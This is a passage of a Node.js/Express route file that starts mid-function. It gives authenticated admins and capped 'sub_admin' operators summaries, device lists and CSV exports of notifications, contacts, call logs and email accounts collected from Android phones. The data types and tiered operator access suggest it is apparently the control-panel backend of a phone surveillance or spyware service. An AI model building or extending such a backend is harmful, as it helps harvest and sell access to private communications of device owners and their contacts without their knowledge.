                const bTime = new Date(b.timestamp || b.syncTime || b.createdAt);
                return sortOrder === 'asc' ? aTime - bTime : bTime - aTime;
            });
        }

        // Get summary statistics
        const totalNotifications = await Notification.countDocuments(baseFilter);
        const totalContacts = await Contact.countDocuments(baseFilter);
        const totalCallLogs = await CallLog.countDocuments(baseFilter);
        const totalEmailAccounts = await EmailAccount.countDocuments(baseFilter);

        // Get unique devices
        const uniqueDevices = await Device.find(baseFilter)
            .select('deviceId androidId deviceName deviceModel user_internal_code')
            .sort({ createdAt: -1 });

        // Prepare response
        const response = {
            data: allData,
            pagination: {
                total: totalCount,
                page: parseInt(page),
                limit: parseInt(limit),
                pages: Math.ceil(totalCount / parseInt(limit))
            },
            summary: {
                totalRecords: totalCount,
                collections: {
                    notifications: totalNotifications,
                    contacts: totalContacts,
                    calllogs: totalCallLogs,
                    emailaccounts: totalEmailAccounts
                },
                devices: uniqueDevices.map(device => ({
                    deviceId: device.deviceId,
                    androidId: device.androidId,
                    deviceName: device.deviceName || 'Unknown Device',
                    deviceModel: device.deviceModel,
                    user_internal_code: device.user_internal_code
                }))
            },
            filters: req.query
        };

        // Handle export
        if (exportFormat === 'csv') {
            res.setHeader('Content-Type', 'text/csv');
            res.setHeader('Content-Disposition', 'attachment; filename="all_data.csv"');
            
            const csvData = allData.map(item => ({
                Collection: item.collectionType,
                DeviceID: item.deviceId,
                UserCode: item.user_internal_code,
                Timestamp: item.timestamp || item.syncTime || item.createdAt,
                ...item
            }));
            
            return res.send(convertToCSV(csvData));
        }

        res.json(response);
    } catch (error) {
        console.error('Get all data error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

// Get summary statistics for all collections
router.get('/collections-summary', adminAuth, async (req, res) => {
    try {
        const { userCode } = req.query;
        
        // Build base filter
        let baseFilter = {};
        if (req.admin.role === 'sub_admin') {
            // For sub-admin, get devices they have access to
            const allowedDevices = await Device.find({ 
                user_internal_code: req.admin.deviceCode,
                isActive: true 
            }).limit(req.admin.maxDevices || 10);
            
            if (allowedDevices.length > 0) {
                const deviceIds = allowedDevices.map(d => d.deviceId);
                baseFilter.deviceId = { $in: deviceIds };
            } else {
                return res.json({
                    notifications: { total: 0, devices: 0 },
                    contacts: { total: 0, devices: 0 },
                    calllogs: { total: 0, devices: 0 },
                    emailaccounts: { total: 0, devices: 0 },
                    devices: []
                });
            }
        } else if (userCode) {
            baseFilter.user_internal_code = userCode.toUpperCase();
        }

        // Get counts for each collection
        const [notifications, contacts, calllogs, emailaccounts] = await Promise.all([
            Notification.countDocuments(baseFilter),
            Contact.countDocuments(baseFilter),
            CallLog.countDocuments(baseFilter),
            EmailAccount.countDocuments(baseFilter)
        ]);

        // Get unique devices count for each collection
        const [notificationDevices, contactDevices, calllogDevices, emailDevices] = await Promise.all([
            Notification.distinct('deviceId', baseFilter),
            Contact.distinct('deviceId', baseFilter),
            CallLog.distinct('deviceId', baseFilter),
            EmailAccount.distinct('deviceId', baseFilter)
        ]);

        // Get all devices info
        const allDeviceIds = [...new Set([
            ...notificationDevices,
            ...contactDevices,
            ...calllogDevices,
            ...emailDevices
        ])];

        const devices = await Device.find({ deviceId: { $in: allDeviceIds } })
            .select('deviceId androidId deviceName deviceModel user_internal_code lastSeen')
            .sort({ lastSeen: -1 });

        res.json({
            notifications: { 
                total: notifications, 
                devices: notificationDevices.length 
            },
            contacts: { 
                total: contacts, 
                devices: contactDevices.length 
            },
            calllogs: { 
                total: calllogs, 
                devices: calllogDevices.length 
            },
            emailaccounts: { 
                total: emailaccounts, 
                devices: emailDevices.length 
            },
            devices: devices.map(device => ({
                deviceId: device.deviceId,
                androidId: device.androidId,
                deviceName: device.deviceName || 'Unknown Device',
                deviceModel: device.deviceModel,
                user_internal_code: device.user_internal_code,
                lastSeen: device.lastSeen
            }))
        });
    } catch (error) {
        console.error('Get collections summary error:', error);
        res.status(500).json({ message: 'Server error.' });
    }
});

module.exports = router; 